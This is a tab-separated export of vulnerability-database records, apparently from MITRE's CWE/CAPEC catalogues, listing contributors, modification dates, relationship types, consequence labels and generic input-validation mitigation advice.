7255	35	MITRE
14908	28	CWE Content Team
8299	39	2010-09-27
22871	28	CWE Content Team
6231	39	2019-06-20
19464	40	The target must have installed test APIs and failed to secure or remove them when brought into a production environment.
23810	28	CWE Content Team
13414	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
9457	85	193
8480	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
11738	102	ChildOf
23973	56	ChildOf
10727	39	2014-06-23
17685	63	Unexpected State
20082	35	MITRE
24572	78	High
19698	35	MITRE
8899	62	updated References
13861	26	Architecture and Design
9215	56	ChildOf
8534	35	MITRE
14170	81	Other
22140	50	Always do bound checking before consuming user input data.
18775	62	updated Relationships
10391	62	updated Relationships, Taxonomy_Mappings
7817	28	Eric Dalci
11686	39	2012-05-11
12039	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Maintenance_Notes, Name, Potential_Mitigations, References, Relationships, Taxonomy_Mappings, Type
18644	63	Hide Activities
22568	28	CWE Content Team
20096	40	SOAP parameters are not properly validated at the service provider
22230	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
12561	100	The MITRE Corporation
20371	39	2017-11-08
7365	35	MITRE
8279	35	MITRE
16251	78	High
10141	63	Unexpected State
23960	35	MITRE
